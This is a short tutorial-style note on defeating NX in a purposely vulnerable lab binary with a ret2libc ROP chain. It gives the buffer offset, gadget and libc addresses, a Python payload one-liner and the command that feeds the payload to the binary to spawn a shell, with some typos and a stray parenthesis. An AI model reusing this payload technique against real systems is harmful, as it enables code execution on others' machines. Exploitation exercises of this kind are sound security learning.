# NX Bypass

In this example we have a vulnerable bninary with these setup
- NX is enabled
- Stack canary is disabled
- PIE is disabled
- ASRL is disabled

If we try to debug and input 108 bytes ("A"*108), we can change the return address 0x0000000a41414141

we can trigger a return using a 104 bytes buffer + return address

Let's find "/bin/sh" in gdb with 'find "/bin/sh"'
- it's at 0x4006e8

Let's find "ssytem() in gdb with 'p syatem'
- it's at 0x7ffff7e35e10

Unfortunately:
- we cannot jump directly onto the stack 
- we cannot jump  directlry to system because we cannot overflow 6 bytes after the 104 but less

The solution is to use ROP, finding a gadget with a ret:
Let's get the address of pop rdi
0x0000000000400693 : pop rdi ; ret


Now the buffer must have
>--------------------------------------------------------------------------------------------
>|AAAA...A (104 bytes) | address of ROP gadget | address of "/bin/sh" | address of system() |
>--------------------------------------------------------------------------------------------

In this way the vulnerable function will execute the ROP gadget, which will also return and it will return to system() address adding 

we can then create the payload with 

> python -c 'print "A"*104 + "\x93\x06\x40\x00\x00\x00\x00\x00" + "\xe8\x06\x40\x00\x00\x00\x00\x00" + "\x10\x5e\xe3\xf7\xff\x7f\x00\x00"') > payload

then exploit with

> (cat payload; cat) | ./bypass_nx